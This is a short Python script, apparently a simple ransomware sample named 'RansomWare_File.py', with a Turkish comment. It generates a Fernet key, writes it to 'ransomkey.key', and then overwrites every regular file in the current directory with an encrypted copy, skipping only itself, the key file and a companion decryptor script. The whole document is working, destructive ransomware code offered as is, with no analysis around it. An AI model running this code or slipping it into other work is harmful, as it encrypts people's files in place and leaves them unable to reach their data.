import os
from cryptography.fernet import Fernet


files = []

for file in os.listdir():
    if file == "RansomWare_File.py" or file == "ransomkey.key" or file == "RansomCracker.py":
        continue
    if os.path.isfile(file):
        # Şifrelenmesi için belirtilen yolda, dosyaları ayıkla ve şifrele. Klasörleri şifrelemez.
        files.append(file)


key = Fernet.generate_key()

with open("ransomkey.key", "wb") as generatedkey:
    generatedkey.write(key)


for file in files:

    with open(file, "rb") as theFile:
        contents = theFile.read()

    encryption = Fernet(key).encrypt(contents)

    with open(file, "wb") as theFile:
        theFile.write(encryption)